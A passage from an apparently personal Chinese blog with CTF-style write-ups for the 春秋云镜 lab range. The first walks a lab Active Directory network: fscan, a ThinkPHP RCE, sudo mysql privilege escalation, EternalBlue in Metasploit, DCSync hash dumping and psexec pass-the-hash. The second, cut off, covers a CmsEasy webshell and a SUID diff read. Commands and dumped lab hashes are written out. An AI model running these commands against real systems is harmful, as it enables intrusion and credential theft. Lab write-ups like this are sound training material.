      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>8k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h1><p>首先进行信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.232.66</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-18 08:00:46] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-18 08:00:46] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-18 08:00:46] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-18 08:00:46] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-18 08:00:46] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:22</span><br><span class="line">[2025-04-18 08:00:46] [SUCCESS] 端口开放 39.99.232.66:80</span><br><span class="line">[2025-04-18 08:00:46] [SUCCESS] 服务识别 39.99.232.66:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-18 08:00:51] [SUCCESS] 服务识别 39.99.232.66:80 =&gt; [http]</span><br><span class="line">[2025-04-18 08:00:55] [INFO] 存活端口数量: 2</span><br><span class="line">[2025-04-18 08:00:55] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-18 08:00:55] [INFO] 加载的插件: ssh, webpoc, webtitle</span><br><span class="line">[2025-04-18 08:00:55] [SUCCESS] 网站标题 http://39.99.232.66       状态码:200 长度:5578   标题:Bootstrap Material Admin</span><br><span class="line">[2025-04-18 08:00:57] [SUCCESS] 目标: http://39.99.232.66:80</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息:</span><br><span class="line">        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><br><span class="line">[2025-04-18 08:01:01] [SUCCESS] 扫描已完成: 3/3</span><br></pre></td></tr></table></figure>

<p>80端口存在thinkphp的漏洞，直接工具一把梭了，拿到shell后提一下权,sudo可以无密码执行mysql，mysql提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/) $ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on ubuntu-web01:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line">User www-data may run the following commands on ubuntu-web01:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure>

<p>拿到了flag的第一部分,写一个公钥进去，然后ssh登录，上传fscan再做一个代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    link/ether 00:16:3e:25:0c:72 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 315359017sec preferred_lft 315359017sec</span><br><span class="line">    inet6 fe80::216:3eff:fe25:c72/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu-web01:~# ./fscan -h 172.22.1.15/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-18 20:14:45] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-18 20:14:45] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-18 20:14:45] [INFO] CIDR范围: 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-04-18 20:14:45] [INFO] 生成IP范围: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-18 20:14:45] [INFO] 解析CIDR 172.22.1.15/24 -&gt; IP范围 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-04-18 20:14:45] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-18 20:14:45] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)</span><br><span class="line">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)</span><br><span class="line">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)</span><br><span class="line">[2025-04-18 20:14:45] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)</span><br><span class="line">[2025-04-18 20:14:48] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-04-18 20:14:48] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:88</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:80</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:80</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.15:22</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:445</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:445</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:445</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:389</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:139</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:139</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:139</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:135</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.2:135</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.21:135</span><br><span class="line">[2025-04-18 20:14:48] [SUCCESS] 端口开放 172.22.1.18:3306</span><br><span class="line">[2025-04-18 20:14:49] [SUCCESS] 服务识别 172.22.1.15:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.18:3306 =&gt; [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server]</span><br><span class="line">[2025-04-18 20:14:53] [SUCCESS] 服务识别 172.22.1.2:88 =&gt;</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:445 =&gt;</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:445 =&gt;</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:445 =&gt;</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.2:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.21:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.18:80 =&gt; [http]</span><br><span class="line">[2025-04-18 20:14:54] [SUCCESS] 服务识别 172.22.1.15:80 =&gt; [http]</span><br><span class="line"></span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.18:135 =&gt;</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.2:135 =&gt;</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] 服务识别 172.22.1.21:135 =&gt;</span><br><span class="line">[2025-04-18 20:15:54] [INFO] 存活端口数量: 15</span><br><span class="line">[2025-04-18 20:15:54] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-18 20:15:54] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.21</span><br><span class="line">主机名: XIAORANG-WIN7</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.21</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.2</span><br><span class="line">主机名: DC01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.2</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.1.18</span><br><span class="line">主机名: XIAORANG-OA01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.1.18</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.15        状态码:200 长度:5578   标题:Bootstrap Material Admin</span><br><span class="line">[2025-04-18 20:15:54] [INFO] 系统信息 172.22.1.2 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.2      DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] 发现漏洞 172.22.1.21 [Windows Server 2008 R2 Enterprise 7601 Service Pack 1] MS17-010</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] 网站标题 http://172.22.1.18        状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.1.18?m=login</span><br><span class="line">[2025-04-18 20:15:54] [SUCCESS] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600</span><br><span class="line">[2025-04-18 20:15:55] [SUCCESS] 网站标题 http://172.22.1.18?m=login 状态码:200 长度:4012   标题:信呼协同办公系统</span><br><span class="line">[2025-04-18 20:15:55] [SUCCESS] 目标: http://172.22.1.15:80</span><br><span class="line">  漏洞类型: poc-yaml-thinkphp5023-method-rce</span><br><span class="line">  漏洞名称: poc1</span><br><span class="line">  详细信息:</span><br><span class="line">        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</span><br></pre></td></tr></table></figure>

<p> 172.22.1.21 有永恒之蓝，上msf梭哈</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line">set RHOSTS 172.22.1.21</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>收集一些域内哈希</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">1000    DC01$   09bb349ab17bbe480b91eb20bb204bee        532480</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1104    XIAORANG-OA01$  25e4b9f501c8831b0568fcc61e4ddc7f        4096</span><br><span class="line">1108    XIAORANG-WIN7$  acf1bc550440e81c9f2663ff304b4ab3        4096</span><br></pre></td></tr></table></figure>

<p>有域控的哈希了直接打域控，然后就可以为所欲为了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.2 -codec gbk</span><br><span class="line">C:\Users\Administrator\flag&gt; type flag03.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-psexec  -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/Administrator@172.22.1.18 -codec gbk</span><br><span class="line">C:\Users\Administrator\flag&gt; type flag02.txt</span><br></pre></td></tr></table></figure>

<h1 id><a href="#" class="headerlink" title></a></h1><p>看别人的wp，好像是要先打172.22.1.18，是一个OA系统可以打nday一把梭，我就不看了</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/touxiang.jpg">
      <meta itemprop="name" content="lvzhouhang">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | lvzhouhang">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/" class="post-title-link" itemprop="url">春秋云镜-Delegation</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-18 10:26:30 / 修改时间：15:40:11" itemprop="dateCreated datePublished" datetime="2025-04-18T10:26:30+08:00">2025-04-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>18k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>17 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h1><p>首先对靶机进行信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.130.13</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-17 22:29:55] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-17 22:29:55] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:22</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:21</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:3306</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 端口开放 39.99.130.13:80</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux  信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-17 22:29:56] [SUCCESS] 服务识别 39.99.130.13:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]</span><br><span class="line">[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:3306 =&gt; [mysql] 版本:8.0.29-0ubuntu0.20.04.3 产品:MySQL</span><br><span class="line">[2025-04-17 22:30:01] [SUCCESS] 服务识别 39.99.130.13:80 =&gt; [http]</span><br><span class="line">[2025-04-17 22:30:04] [INFO] 存活端口数量: 4</span><br><span class="line">[2025-04-17 22:30:04] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-17 22:30:04] [INFO] 加载的插件: ftp, mysql, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-17 22:30:05] [SUCCESS] 网站标题 http://39.99.130.13       状态码:200 长度:68104  标题:中文网页标题</span><br></pre></td></tr></table></figure>

<p>80端口是cmseasy,url后面拼接/admin版本号是v7752,在网上可以查到漏洞</p>
<p><a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</a></p>
<p>都需要登录后台，弱口令admin:123456登录成功了</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation1.png"></p>
<p>发包然后去访问1.php可以发现写入成功了，写个一句话木马，然后蚁剑连接</p>
<p>flag在/home/flag/下，但是只有root能查看，反弹一个shell准备提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/var/www/html$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>

<p>可以看到diff具有suid权限，可以读取flag01.txt</p>
<h1 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h1><p>还给了一个hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Great job!!!!!!</span><br><span class="line">Here is the hint: WIN19\Adrian</span><br><span class="line">I&#x27;ll do whatever I can to rock you...</span><br></pre></td></tr></table></figure>

<p>上传一个fscan先扫，然后做一个代理隧道</p>
